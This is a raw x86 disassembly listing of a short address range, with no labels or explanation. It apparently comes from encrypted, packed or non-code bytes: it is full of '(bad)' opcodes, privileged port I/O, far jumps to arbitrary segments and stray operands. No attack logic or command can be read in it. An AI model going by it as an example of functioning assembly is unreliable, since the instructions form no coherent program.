  4019be:	jmp    0x91ee528a
  4019c3:	in     al,dx
  4019c4:	hlt    
  4019c5:	sub    al,0x72
  4019c7:	ss int 0xc0
  4019ca:	mov    edx,0x25930283
  4019cf:	mov    ah,0x27
  4019d1:	fnstenv [esi]
  4019d3:	mov    edi,0xcd1eac5b
  4019d8:	lahf   
  4019d9:	pop    esp
  4019da:	mov    cl,0xde
  4019dc:	inc    ebx
  4019dd:	xchg   DWORD PTR [edx+0x7e],ecx
  4019e0:	mov    ecx,0xe71c2586
  4019e5:	mov    ds:0xa6d3f7a2,eax
  4019ea:	pop    ecx
  4019eb:	inc    edi
  4019ec:	add    BYTE PTR [edx+ebp*2],0xcf
  4019f0:	adc    al,0xd0
  4019f2:	retf   0x5ca5
  4019f5:	xlat   BYTE PTR ds:[ebx]
  4019f6:	and    edx,DWORD PTR [edi]
  4019f8:	mov    esi,0x5a890eee
  4019fd:	aas    
  4019fe:	sub    DWORD PTR [ecx-0x244c3dcc],esi
  401a04:	inc    eax
  401a05:	test   DWORD PTR [esi-0x29],0xb2016bcc
  401a0c:	cmc    
  401a0d:	jg     0x4019cc
  401a0f:	leave  
  401a10:	sbb    DWORD PTR [esp+esi*8-0x16165e8c],ebp
  401a17:	push   ecx
  401a18:	sub    al,cl
  401a1a:	or     edx,DWORD PTR [eax+0x2b67f2d5]
  401a20:	aaa    
  401a21:	aam    0x9f
  401a23:	add    BYTE PTR [ebp-0xa73ea63],0x72
  401a2a:	js     0x401a6c
  401a2c:	mov    ds:0x136411b1,al
  401a31:	sbb    ah,ah
  401a33:	jns    0x401a93
  401a35:	test   eax,0x225f9d39
  401a3a:	mov    bh,0x84
  401a3c:	add    al,0x79
  401a3e:	jge    0x4019dc
  401a40:	cmp    ch,BYTE PTR [ebp+0x32e49210]
  401a46:	cmp    cl,cl
  401a48:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  401a4a:	mov    ah,0x6c
  401a4c:	ret    0x52de
  401a4f:	push   eax
  401a50:	push   ecx
  401a51:	vxorps xmm6,xmm7,XMMWORD PTR [eax]
  401a55:	mov    DWORD PTR [eax],edi
  401a57:	scas   eax,DWORD PTR es:[edi]
  401a58:	jne    0x401aa9
  401a5a:	ret    0x12ce
  401a5d:	sahf   
  401a5e:	inc    ebx
  401a5f:	jmp    FWORD PTR [ebp+0x62]
  401a62:	stos   DWORD PTR es:[edi],eax
  401a63:	sub    DWORD PTR [edx+0x139f65e3],esp
  401a69:	out    dx,eax
  401a6a:	gs xchg edi,eax
  401a6c:	and    BYTE PTR [edi],bl
  401a6e:	jb     0x4019f9
  401a70:	hlt    
  401a71:	add    al,0xc4
  401a73:	or     edx,DWORD PTR [edi]
  401a75:	aam    0x74
  401a77:	mov    ds:0xdf070930,al
  401a7c:	add    eax,0x7262b253
  401a81:	lea    ebx,[eax+0x1d]
  401a84:	aaa    
  401a85:	data16 xor al,0xa8
  401a88:	jge    0x401b03
  401a8a:	outs   dx,DWORD PTR ds:[esi]
  401a8b:	jns    0x401a83
  401a8d:	mov    ebx,0x28e1c193
  401a92:	and    dl,BYTE PTR [ebx]
  401a94:	je     0x401aaa
  401a96:	rcl    BYTE PTR [edx-0x63c92041],1
  401a9c:	or     DWORD PTR [esi+ebp*2],ebx
  401a9f:	out    dx,eax
  401aa0:	cmp    al,0xb3
  401aa2:	cdq    
  401aa3:	stos   DWORD PTR es:[edi],eax
  401aa4:	adc    al,0x51
  401aa6:	or     eax,0xa41aa186
  401aab:	pop    esi
  401aac:	test   bh,dl
  401aae:	adc    eax,esi
  401ab0:	outs   dx,BYTE PTR ds:[esi]
  401ab1:	js     0x401a9c
  401ab3:	push   ecx
  401ab4:	jo     0x401a93
  401ab6:	sub    eax,DWORD PTR [bp+di+0x5527]
  401abb:	and    DWORD PTR [ecx+0x61b07385],0x6d
  401ac2:	data16 int 0xa1
  401ac5:	inc    ecx
  401ac6:	xchg   DWORD PTR [esi+0x53],edi
  401ac9:	pop    ebp
  401aca:	mov    bl,0x61
  401acc:	outs   dx,BYTE PTR ds:[esi]
  401acd:	data16 mov dl,0x73
  401ad0:	cmp    bh,dl
  401ad2:	xor    DWORD PTR [ebx-0x3e08cc70],eax
  401ad8:	(bad)  ds:0x4eb6d1ec
  401ade:	mov    al,0x5d
  401ae0:	pop    edx
  401ae1:	cli    
  401ae2:	pop    es
  401ae3:	add    BYTE PTR [ecx-0x37],ch
  401ae6:	cmp    BYTE PTR [ebx+0x19d5c590],ah
  401aec:	cmp    ebp,edx
  401aee:	enter  0x4c1b,0x39
  401af2:	das    
  401af3:	xlat   BYTE PTR ds:[ebx]
  401af4:	dec    ebx
  401af5:	push   0x0
  401af7:	xchg   edi,eax
  401af8:	and    ecx,DWORD PTR [esi-0x4f56e98f]
  401afe:	out    dx,eax
  401aff:	dec    edx
  401b00:	ins    BYTE PTR es:[edi],dx
  401b01:	inc    eax
  401b02:	lea    ebp,[edi-0x1e03111e]
  401b08:	inc    eax
  401b09:	hlt    
  401b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b0b:	jp     0x401b68
  401b0d:	ret    
  401b0e:	lods   eax,DWORD PTR ds:[esi]
  401b0f:	jp     0x401aa6
  401b11:	mov    cl,0x46
  401b13:	jecxz  0x401aab
  401b15:	dec    ecx
  401b16:	inc    esp
  401b17:	or     al,ah
  401b19:	fbstp  TBYTE PTR [ebx-0x1d]
  401b1c:	pop    es
  401b1d:	pop    eax
  401b1e:	sbb    DWORD PTR [ecx-0x219d6522],edi
  401b24:	shl    BYTE PTR [ebx],cl
  401b26:	enter  0x55f4,0x22
  401b2a:	fadd   st(1),st
  401b2c:	jne    0x401b04
  401b2e:	hlt    
  401b2f:	jg     0x401b17
  401b31:	xchg   ecx,eax
  401b32:	and    eax,0x552be05a
  401b37:	bnd jb 0x401b76
  401b3a:	push   0xcaabc3cd
  401b3f:	inc    edi
  401b40:	scas   eax,DWORD PTR es:[edi]
  401b41:	inc    edi
  401b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b43:	xchg   edi,eax
  401b44:	fcom   DWORD PTR [esi]
  401b46:	ror    BYTE PTR [ecx-0x70fd71be],1
  401b4c:	dec    ecx
  401b4d:	pop    esp
  401b4e:	fisub  WORD PTR [esp+edx*4+0x46]
  401b52:	jecxz  0x401bac
  401b54:	ja     0x401bcd
  401b56:	jns    0x401bbb
  401b58:	inc    esi
  401b59:	ret    0x8cc6
  401b5c:	push   ebp
  401b5d:	xor    ebp,eax
  401b5f:	xor    WORD PTR [edi+0x18],dx
  401b63:	xchg   edx,eax
  401b64:	repz add edx,DWORD PTR [ebp-0x62]
  401b68:	add    dl,bh
  401b6a:	mov    edx,0xebc2a1ed
  401b6f:	pushf  
  401b70:	movzx  ecx,WORD PTR [ebx+0x2c]
  401b74:	shl    DWORD PTR [ebx+eax*1-0x5e8c4167],1
  401b7b:	cmp    al,0xc9
  401b7d:	pop    DWORD PTR [ebx+0x3a0a6e2e]
  401b83:	call   0x5d9b:0x51dacc86
  401b8a:	pop    ds
  401b8b:	pop    esp
  401b8c:	or     al,0xa7
  401b8e:	cdq    
  401b8f:	mov    eax,ds:0xd8979a49
  401b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b95:	ja     0x401bcf
  401b97:	(bad)  
  401b98:	not    BYTE PTR [ecx-0x6a]
  401b9b:	push   0x27c24ba8
  401ba0:	mov    eax,0xe52bd448
  401ba5:	cmc    
  401ba6:	dec    edi
  401ba7:	out    dx,eax
  401ba8:	fidivr DWORD PTR [ecx+0x64c5abac]
  401bae:	aad    0x5c
  401bb0:	cmp    eax,0x8070d711
  401bb5:	mov    eax,DWORD PTR [ebx+0x7279db31]
  401bbb:	xor    al,0xd9
  401bbd:	mov    ah,BYTE PTR ss:[edx]
  401bc0:	push   eax
  401bc1:	adc    ecx,DWORD PTR [eax+0x9ba9743]
  401bc7:	pop    edi
  401bc8:	dec    esi
  401bc9:	mov    WORD PTR [edx-0x18],?
  401bcc:	xor    eax,0x2657d5d1
  401bd1:	retf   0xbe09
  401bd4:	pop    esi
  401bd5:	pop    ds
  401bd6:	sub    eax,0x5672c1e0
  401bdb:	fld    TBYTE PTR [edx-0x62037016]
  401be1:	sub    bh,al
  401be3:	push   cs
  401be4:	pop    edx
  401be5:	or     esi,DWORD PTR [ecx-0x2b]
  401be8:	pushf  
  401be9:	jbe    0x401bf5
  401beb:	data16 icebp 
  401bed:	fmul   DWORD PTR [edi+0x70]
  401bf0:	out    dx,eax
  401bf1:	push   edi
  401bf2:	shl    BYTE PTR [esi],cl
  401bf4:	and    edi,edx
  401bf6:	(bad)  
  401bf7:	push   esp
  401bf8:	cdq    
  401bf9:	int    0xa2
  401bfb:	(bad)  
  401bfc:	loopne 0x401bd1
  401bfe:	and    ebp,esi
  401c00:	mov    es,edi
  401c02:	bound  ecx,QWORD PTR ds:0xde18a8a8
  401c08:	mov    ecx,0x2ba3e217
  401c0d:	xchg   edx,eax
  401c0e:	test   DWORD PTR [edx-0x49],ebp
  401c11:	and    ebx,ebx
  401c13:	mov    ebp,0x399b8791
  401c18:	test   BYTE PTR [esi-0x23],dl
  401c1b:	jge    0x401ba3
  401c1d:	leave  
  401c1e:	addr16 jle 0x401bba
  401c21:	mov    DWORD PTR [ebp+0x4d9dceab],edx
  401c27:	rcl    BYTE PTR [esp+0x643d6918],0xfe
  401c2f:	jb     0x401bc2
  401c31:	shr    BYTE PTR [ecx-0x4b2ab6b0],0x26
  401c38:	jmp    0x16115453
  401c3d:	aad    0xec
  401c3f:	fnstcw WORD PTR [edx]
  401c41:	fmul   st(6),st
  401c43:	add    DWORD PTR [ebp+ebp*8-0x33],ecx
  401c47:	pop    ds
  401c48:	daa    
  401c49:	lods   eax,DWORD PTR ds:[esi]
  401c4a:	inc    esp
  401c4b:	int3   
  401c4c:	push   ecx
  401c4d:	xchg   ebx,eax
  401c4e:	es cli 
  401c50:	sub    ah,ah
  401c52:	faddp  st(5),st
  401c54:	in     al,dx
  401c55:	push   cs
  401c56:	mov    ds:0x9c21c996,al
  401c5b:	in     al,dx
  401c5c:	icebp  
  401c5d:	stos   BYTE PTR es:[edi],al
  401c5e:	inc    edx
  401c5f:	retf   0x1ffc
  401c62:	xchg   ecx,eax
  401c63:	nop
  401c64:	inc    eax
  401c65:	push   ebx
  401c66:	inc    ecx
  401c67:	mov    ah,0x91
  401c69:	mov    WORD PTR [esi-0x40],bx
  401c6d:	nop
  401c6e:	pop    eax
  401c6f:	adc    ebp,ebp
  401c71:	mov    bh,dl
  401c73:	dec    ecx
  401c74:	arpl   WORD PTR [ecx],bx
  401c76:	shl    DWORD PTR [ecx],0xab
  401c79:	out    dx,al
  401c7a:	(bad)  
  401c7b:	pop    edi
  401c7c:	inc    ebx
  401c7d:	adc    ch,0x19
  401c80:	push   eax
  401c81:	out    0x22,al
  401c83:	hlt    
  401c84:	or     BYTE PTR [ebx-0x52],dh
  401c87:	or     al,0x86
  401c89:	sahf   
  401c8a:	cli    
  401c8b:	or     bl,BYTE PTR [ebx]
  401c8d:	pop    edx
  401c8e:	ss out dx,al
  401c90:	xor    DWORD PTR [ebp-0x6eb02b0],ebp
  401c96:	cmp    DWORD PTR [ebx+0x68],0xffffffc0
  401c9a:	fwait
  401c9b:	xchg   DWORD PTR [eax-0x348441c9],esp
  401ca1:	push   cs
  401ca2:	jp     0x401cda
  401ca4:	scas   al,BYTE PTR es:[edi]
  401ca5:	pop    esp
  401ca6:	mov    dl,BYTE PTR [edx]
  401ca8:	out    dx,eax
  401ca9:	sbb    edi,DWORD PTR [ebx]
  401cab:	idiv   dl
  401cad:	inc    esi
  401cae:	fs retf 0xaf2
  401cb2:	into   
  401cb3:	and    edx,esp
  401cb5:	xchg   DWORD PTR [ebx+0x19734e47],edx
  401cbb:	ins    BYTE PTR es:[edi],dx
  401cbc:	pop    ebp
  401cbd:	add    ebp,DWORD PTR [ebx+0x59]
  401cc0:	jne    0x401c67
  401cc2:	cmp    ch,ah
  401cc4:	or     bl,BYTE PTR ds:0x8b539d00
  401cca:	(bad)  [eax-0x46f888a8]
  401cd0:	leave  
  401cd1:	test   eax,0x78c41acc
  401cd6:	push   esi
  401cd7:	in     al,dx
  401cd8:	jo     0x401d3c
  401cda:	sbb    BYTE PTR [ebp+esi*2-0x79],ah
  401cde:	dec    esp
  401cdf:	mov    bh,0x5c
  401ce1:	addr16 dec esi
  401ce3:	mov    bl,0xb2
  401ce5:	popf   
  401ce6:	push   ds
  401ce7:	sub    ch,BYTE PTR [ecx+eiz*2]
  401cea:	mov    al,BYTE PTR [ebx+0x5648df4d]
  401cf0:	imul   eax,ecx,0xffffff9c
  401cf3:	jge    0x401cda
  401cf5:	out    0x2f,al
  401cf7:	es mov edi,0xe573e670
  401cfd:	pop    DWORD PTR ds:0x31eed7c5
  401d03:	in     eax,0x88
  401d05:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  401d07:	data16 cmp al,0x31
  401d0a:	out    0x9f,al
  401d0c:	ins    DWORD PTR es:[edi],dx
  401d0d:	mov    cl,BYTE PTR [edx]
  401d0f:	inc    edx
  401d10:	inc    edx
  401d11:	mov    ecx,?
  401d13:	int    0x20
  401d15:	ins    BYTE PTR es:[di],dx
  401d17:	pop    ebp
  401d18:	icebp  
  401d19:	call   DWORD PTR [eax-0x19b51e4f]
  401d1f:	jns    0x401cf3
  401d21:	adc    BYTE PTR ds:0xf6a2e7ff,0xcc
  401d28:	xchg   edi,eax
  401d29:	imul   edx,DWORD PTR [eax+0x7513b390],0x1953fd7d
  401d33:	mov    dl,0xe
  401d35:	xor    eax,0xb1e83886
  401d3a:	dec    eax
  401d3b:	adc    bh,BYTE PTR [edi+0x7cf21bc0]
  401d41:	sub    DWORD PTR [eax-0x1c],esp
  401d44:	mov    ch,0x3b
  401d46:	mov    ch,0x13
  401d48:	retf   0xdda5
  401d4b:	ror    DWORD PTR [ecx+0x6063d1a8],0xba
  401d52:	addr16 lock mov bh,0x57
  401d56:	rol    BYTE PTR [edx+0x29],0x3f
  401d5a:	popf   
  401d5b:	inc    edi
  401d5c:	dec    esp
  401d5d:	test   eax,0x81f70046
  401d62:	call   FWORD PTR [ebx+ebp*2+0xa]
  401d66:	inc    esp
  401d67:	cmp    cl,BYTE PTR [eax+0x54]
  401d6a:	and    DWORD PTR [esi+0x2176ab3b],edx
  401d70:	mov    ecx,0x47b26f14
  401d75:	xlat   BYTE PTR ds:[ebx]
  401d76:	cld    
  401d77:	push   ds
  401d78:	jmp    ecx
  401d7a:	or     DWORD PTR ds:0x44505dc8,eax
  401d80:	cmc    
  401d81:	repz push esp
  401d83:	push   esp
  401d84:	fcom   DWORD PTR [edi+eax*1-0x7955d32a]
  401d8b:	adc    al,0xc
  401d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d8e:	add    DWORD PTR [esi+0x76],0xd596394
  401d95:	mov    edx,ecx
  401d97:	mov    al,0xe9
  401d99:	push   eax
  401d9a:	adc    eax,0xd255122c
  401d9f:	push   edx
  401da0:	adc    ah,BYTE PTR [edx]
  401da2:	mov    esp,0xd5166a34
  401da7:	mov    gs,WORD PTR [eax+ebp*4]
  401daa:	mov    edx,?
  401dac:	repz pop eax
  401dae:	jl     0x401d54
  401db0:	mov    edx,0x2140c062
  401db5:	dec    ecx
  401db6:	push   ebx
  401db7:	cmp    al,0x14
  401db9:	in     al,dx
  401dba:	xchg   bl,dl
  401dbc:	inc    ebx
  401dbd:	aaa    
  401dbe:	push   ebp
  401dbf:	outs   dx,BYTE PTR ds:[esi]
  401dc0:	clc    
  401dc1:	pushf  
  401dc2:	data16 lahf 
  401dc4:	or     al,0xef
  401dc6:	and    ebx,DWORD PTR [ecx-0x31]
  401dc9:	xchg   edx,eax
  401dca:	sbb    BYTE PTR [ecx-0xa],ch
  401dcd:	(bad)  
  401dce:	jmp    0xa9b6:0x3dbd7fd3
  401dd5:	sub    ch,dl
  401dd7:	dec    edi
  401dd8:	ss adc eax,0x40209997
  401dde:	sbb    dh,dl
  401de0:	sbb    DWORD PTR [ecx+esi*2],esp
  401de3:	dec    esp
  401de4:	push   ebx
  401de5:	push   ss
  401de6:	mov    WORD PTR [edx],ds
  401de8:	popa   
  401de9:	sbb    edi,DWORD PTR [edx+0x3c]
  401dec:	stc    
  401ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dee:	sub    eax,0xff1239a4
  401df3:	ret    0xaa42
  401df6:	dec    esi
  401df7:	ins    DWORD PTR es:[edi],dx
  401df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401df9:	xchg   esi,eax
  401dfa:	xor    eax,0x511d0940
  401dff:	push   cs
  401e00:	pop    edx
  401e01:	mov    ebx,eax
  401e03:	mov    al,ds:0xcd8d4e11
  401e08:	add    al,0xa9
  401e0a:	jbe    0x401db5
  401e0c:	mov    ah,0x93
  401e0e:	retf   0x42dc
  401e11:	loope  0x401e51
  401e13:	cdq    
  401e14:	xchg   edx,eax
  401e15:	(bad)  
  401e17:	test   al,0xa3
  401e19:	xchg   ecx,eax
  401e1a:	in     al,0xe9
  401e1c:	iret   
  401e1d:	fimul  WORD PTR [esi+0xf]
  401e20:	outs   dx,DWORD PTR ds:[esi]
  401e21:	ja     0x401dec
  401e23:	nop
  401e24:	mov    ecx,0x8121e68c
  401e29:	jnp    0x401dfb
  401e2b:	sti    
  401e2c:	cld    
  401e2d:	cdq    
  401e2e:	int3   
  401e2f:	loopne 0x401e37
  401e31:	and    cl,bh
  401e33:	jl     0x401df0
  401e35:	call   0x17b5b471
  401e3a:	push   edx
  401e3b:	mov    esp,0x18b267f3
  401e40:	loopne 0x401e50
  401e42:	xchg   ebx,eax
  401e43:	mov    ecx,0xfc10dfb5
  401e48:	lea    esp,[edi+0x65019e15]
  401e4e:	outs   dx,DWORD PTR ds:[esi]
  401e4f:	mov    al,ds:0x556c64b6
  401e54:	je     0x401e46
  401e56:	mov    WORD PTR gs:[ecx],ss
  401e59:	add    BYTE PTR [ebx-0x29],ah
  401e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e5d:	jecxz  0x401ede
  401e5f:	xchg   ebp,eax
  401e60:	je     0x401e87
  401e62:	shl    al,cl
  401e64:	hlt    
  401e65:	int    0x6
  401e67:	mov    ?,ebx
  401e69:	stos   BYTE PTR es:[edi],al
  401e6a:	xor    ebp,DWORD PTR [ebx+ebx*8+0x1c]
  401e6e:	(bad)  
  401e6f:	lock inc edi
  401e71:	pop    edi
  401e72:	dec    ecx
  401e73:	jnp    0x401e90
  401e75:	push   ss
  401e76:	push   es
  401e77:	mov    es,ecx
  401e79:	jns    0x401eb2
  401e7b:	push   ds
  401e7c:	cmp    ch,BYTE PTR [eax+0xe8e0a43]
  401e82:	jle    0x401eba
  401e84:	push   ss
  401e85:	fistp  QWORD PTR [eax-0x7d]
  401e88:	mov    dl,0x2f
  401e8a:	push   esi
  401e8b:	jo     0x401e7a
  401e8d:	test   ebx,eax
  401e8f:	stos   BYTE PTR es:[edi],al
  401e90:	mov    ds:0x13825845,eax
  401e95:	mov    esp,0x46e34ef9
  401e9a:	out    dx,eax
  401e9b:	mov    esp,0x41fc7b26
  401ea0:	sbb    al,0x84
  401ea2:	out    0x43,eax
  401ea4:	add    dh,BYTE PTR [ebx+eax*2-0x345ee4a4]
  401eab:	ret    0x4260
  401eae:	(bad)  
  401eb0:	scas   al,BYTE PTR es:[edi]
  401eb1:	(bad)  
  401eb2:	fs rol edx,1
  401eb5:	out    0x8c,al
  401eb7:	jnp    0x401eff
  401eb9:	(bad)  
  401eba:	icebp  
  401ebb:	scas   al,BYTE PTR es:[edi]
  401ebc:	daa    
  401ebd:	les    edi,FWORD PTR [esi+0x38]
  401ec0:	xchg   edx,eax
  401ec1:	sub    bh,BYTE PTR [ecx+0x3d]
  401ec4:	cmc    
  401ec5:	inc    esp
  401ec6:	mov    ch,0x99
  401ec8:	fwait
  401ec9:	add    DWORD PTR [ecx],esi
  401ecb:	sub    al,cl
  401ecd:	icebp  
  401ece:	lods   al,BYTE PTR ds:[esi]
  401ecf:	arpl   WORD PTR [ecx-0x21],dx
  401ed2:	dec    ecx
  401ed3:	stc    
  401ed4:	xor    cl,dh
  401ed6:	lds    esp,FWORD PTR [eax+0x26]
  401ed9:	dec    eax
  401eda:	xchg   BYTE PTR [ecx],ch
  401edc:	or     al,0x57
  401ede:	push   0xf26bc4a2
  401ee3:	jge    0x401e84
  401ee5:	(bad)  
  401ee6:	ret    
  401ee7:	pop    ebp
  401ee8:	(bad)  [ebp+0x3e]
  401eeb:	sub    DWORD PTR [edx],edx
  401eed:	pop    edi
  401eee:	(bad)  
  401eef:	rcr    DWORD PTR [ecx-0x65],cl
  401ef2:	fbld   TBYTE PTR [eax]
  401ef4:	popa   
  401ef5:	push   es
  401ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ef7:	ret    0x4cf3
  401efa:	mov    esp,0xeb2b16c3
  401eff:	mov    esi,0xb203708e
  401f04:	shr    DWORD PTR [esi],1
  401f06:	clc    
  401f07:	fs lock inc ebx
  401f0a:	test   eax,0x7e6cc89
  401f0f:	fucomip st,st(5)
  401f11:	(bad)  [ecx]
  401f13:	sub    bh,BYTE PTR [ebp-0x39]
  401f16:	aas    
  401f17:	xor    eax,0x8537e38f
  401f1c:	gs sahf 
  401f1e:	mov    esi,0xf4a13857
  401f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f24:	fldcw  WORD PTR [edi+0x4774c827]
  401f2a:	or     al,0xc
  401f2c:	lods   eax,DWORD PTR ds:[esi]
  401f2d:	sub    eax,0xffffff81
  401f30:	lahf   
  401f31:	cdq    
  401f32:	or     edi,edx
  401f34:	adc    BYTE PTR [eax+edi*8+0x328ddb43],dh
  401f3b:	cmp    BYTE PTR [ebx],ch
  401f3d:	inc    esi
  401f3e:	fdiv   QWORD PTR [eax-0x1a]
  401f41:	ret    
  401f42:	loopne 0x401f4d
  401f44:	mov    edi,0xb4a17664
  401f49:	or     al,0xe
  401f4b:	stc    
  401f4c:	xchg   edi,eax
  401f4d:	(bad)  
  401f4e:	mov    al,0x73
  401f50:	jge    0x401f6f
  401f52:	mov    al,ds:0xb9baccec
  401f57:	xchg   ebx,eax
  401f58:	jg     0x401f46
  401f5a:	cli    
  401f5b:	mov    ?,ecx
  401f5d:	fwait
  401f5e:	push   esi
  401f5f:	test   DWORD PTR [ecx+0x74],esp
  401f62:	xchg   edx,esi
  401f64:	mov    ecx,esp
  401f66:	jp     0x401fb4
  401f68:	clc    
  401f69:	test   DWORD PTR [ecx],0x8b7c4cbf
  401f6f:	pop    ds
  401f70:	outs   dx,BYTE PTR ds:[esi]
  401f71:	xlat   BYTE PTR ds:[ebx]
  401f72:	push   esp
  401f73:	and    BYTE PTR [ecx],bh
  401f75:	mul    DWORD PTR [ecx-0x73]
  401f78:	popf   
  401f79:	mov    eax,ds:0x12fc6ee3
  401f7e:	icebp  
  401f7f:	and    DWORD PTR [esi+0x287daca3],esp
  401f85:	jmp    0xdf40:0x3920bf93
  401f8c:	adc    eax,0x96bfa5d1
  401f91:	jne    0x402002
  401f93:	jle    0x401f52
  401f95:	call   0x881d:0x7fb88e38
  401f9c:	push   edi
  401f9d:	jle    0x401f23
  401f9f:	or     al,0xc7
  401fa1:	cs mov ecx,0x55d22f4b
  401fa7:	or     BYTE PTR [ebp+eax*1-0x52],dh
  401fab:	rcr    eax,1
  401fad:	test   al,bl
  401faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fb0:	arpl   WORD PTR [esi-0x27496436],ax
  401fb6:	sub    ch,al
  401fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fb9:	std    
  401fba:	add    eax,0xc9caf91d
  401fbf:	pusha  
  401fc0:	mov    ebp,0xbca5b06d
  401fc5:	jg     0x401f7f
  401fc7:	(bad)  
  401fc8:	or     al,0xdc
  401fca:	or     al,0xfb
  401fcc:	xchg   BYTE PTR [edi],dl
  401fce:	mov    al,ds:0xa34a72ba
  401fd3:	mov    edi,0xf4bbf541
  401fd8:	test   eax,0x3b022d54
  401fdd:	repz pusha 
  401fdf:	dec    esp
  401fe0:	std    
  401fe1:	inc    esp
  401fe2:	lods   eax,DWORD PTR ds:[esi]
  401fe3:	ss jns 0x402031
  401fe6:	mov    edi,0xd8f5c28e
  401feb:	dec    edx
  401fec:	and    esi,DWORD PTR [eax]
  401fee:	and    dl,BYTE PTR [esi+0x51]
  401ff1:	ins    DWORD PTR es:[edi],dx
  401ff2:	pusha  
  401ff3:	mov    ebx,0xd6e1da7f
  401ff8:	enter  0xa698,0xbe
  401ffc:	fstp   TBYTE PTR [ebx-0x748ca19c]
  402002:	push   cs
  402003:	dec    esi
  402004:	cmp    al,BYTE PTR [edx]
  402006:	inc    esp
  402007:	inc    edi
  402008:	popf   
  402009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40200a:	rcl    BYTE PTR [eax+ebp*4+0x1c55dadd],1
  402011:	pop    es
  402012:	mov    dl,0xa2
  402014:	cmp    cl,ah
  402016:	nop
  402017:	sub    edi,ecx
  402019:	and    al,0xd1
  40201b:	ins    BYTE PTR es:[edi],dx
  40201c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40201d:	dec    eax
  40201e:	in     al,dx
  40201f:	hlt    
  402020:	mov    ebx,0x22289f9d
  402025:	or     ebx,DWORD PTR ds:0x1938124c
  40202b:	(bad)  
  40202c:	in     eax,dx
  40202d:	mov    bh,0xcc
  40202f:	cmp    al,BYTE PTR [ebx]
  402031:	mov    bl,0x3c
  402033:	xchg   DWORD PTR [ecx-0x5fd4ebb0],esi
  402039:	shr    DWORD PTR [esi+0x38],0x6d
  40203d:	jae    0x402056
  40203f:	sub    BYTE PTR [ecx+0x68facd6c],bh
  402045:	fild   WORD PTR [eax+edx*2]
  402048:	pop    ebp
  402049:	out    dx,al
  40204a:	pop    es
  40204b:	mov    BYTE PTR [edx],cl
  40204d:	outs   dx,BYTE PTR ds:[esi]
  40204e:	out    dx,al
  40204f:	mov    ecx,DWORD PTR [ebx+0x5d]
  402052:	retf   0x7c66
  402055:	int    0xbd
  402057:	mov    dl,0xa7
  402059:	out    dx,eax
  40205a:	push   eax
  40205b:	ror    eax,0xfd
  40205e:	les    edi,FWORD PTR [edx-0x891fb5b]
  402064:	and    esi,DWORD PTR [ebx+esi*4+0x16]
  402068:	jnp    0x401fff
  40206a:	addr16 xchg esi,eax
  40206c:	popa   
  40206d:	mov    cl,BYTE PTR [eax+0x20066444]
  402073:	dec    ebx
  402074:	imul   ebp,DWORD PTR [edi+0x4638c293],0x56049ca9
  40207e:	pushf  
  40207f:	(bad)  
  402080:	mul    ebp
  402082:	scas   al,BYTE PTR es:[edi]
  402083:	xor    al,0x2f
  402085:	jmp    0x402062
  402087:	jo     0x4020b4
  402089:	jmp    ebp
  40208b:	inc    ebx
  40208c:	aas    
  40208d:	dec    ebp
  40208e:	stos   DWORD PTR es:[edi],eax
  40208f:	dec    esi
  402090:	and    eax,0x509d78a0
  402095:	pop    edx
  402096:	mov    dh,ah
  402098:	fisubr DWORD PTR [ecx-0x3b]
  40209b:	xchg   ecx,eax
  40209c:	sbb    al,0x3e
  40209e:	lds    esi,FWORD PTR [ecx+0x1c]
  4020a1:	and    ebp,DWORD PTR [eax-0x2935b298]
  4020a7:	xlat   BYTE PTR ds:[ebx]
  4020a8:	inc    esi
  4020a9:	jb     0x402077
  4020ab:	sbb    BYTE PTR [ebp+0x14371646],al
  4020b1:	stos   BYTE PTR es:[edi],al
  4020b2:	imul   eax,DWORD PTR [eax-0x14],0x71
  4020b6:	push   cs
  4020b7:	jg     0x4020c8
  4020b9:	aad    0x54
  4020bb:	cwde   
  4020bc:	xor    al,0x62
  4020be:	xchg   esp,eax
  4020bf:	adc    DWORD PTR [ebx+0x1a51c450],0x26e8b1ca
  4020c9:	test   DWORD PTR [eax+eiz*2+0x548b8be],0xc54980b5
  4020d4:	subps  xmm7,XMMWORD PTR [ecx]
  4020d7:	popf   
  4020d8:	push   esi
  4020d9:	push   ss
  4020da:	nop
  4020db:	add    BYTE PTR [ebp-0xc766883],bl
  4020e1:	sbb    DWORD PTR [esi-0x5147911d],esp
  4020e7:	not    DWORD PTR [ecx-0x13b84f4d]
  4020ed:	ror    BYTE PTR [eax+edx*2+0x62070acc],cl
  4020f4:	xchg   edx,edi
  4020f6:	rcl    cl,0xa7
  4020f9:	cmp    DWORD PTR [edx],ecx
  4020fb:	sub    ebx,DWORD PTR [eax]
  4020fd:	mov    bl,0x8a
  4020ff:	int    0x20
  402101:	mov    dh,0x3e
  402103:	in     eax,0xcc
  402105:	dec    ebp
  402106:	cmp    BYTE PTR [esi],al
  402108:	mov    bh,0xc5
  40210a:	cs cmp ah,bl
  40210d:	jle    0x4020f3
  40210f:	out    dx,al
  402110:	loope  0x402151
  402112:	adc    eax,0x6a47c11c
  402117:	stos   DWORD PTR es:[edi],eax
  402118:	fbld   TBYTE PTR [ecx+eiz*4]
  40211b:	xchg   esp,eax
  40211c:	es aas 
  40211e:	(bad)  
  40211f:	clc    
  402120:	push   0x7182e6f8
  402125:	push   ebp
  402126:	loope  0x402114
  402128:	rol    BYTE PTR [edx-0x607d8b38],cl
  40212e:	jle    0x402115
  402130:	das    
  402131:	je     0x402114
  402133:	mov    esi,0x3f551055
  402138:	mov    cl,0x8b
  40213a:	(bad)  
  40213b:	push   es
  40213c:	push   eax
  40213d:	and    eax,edi
  40213f:	sub    BYTE PTR [edi],0x2d
  402142:	mov    DWORD PTR [ebp-0x3d],esi
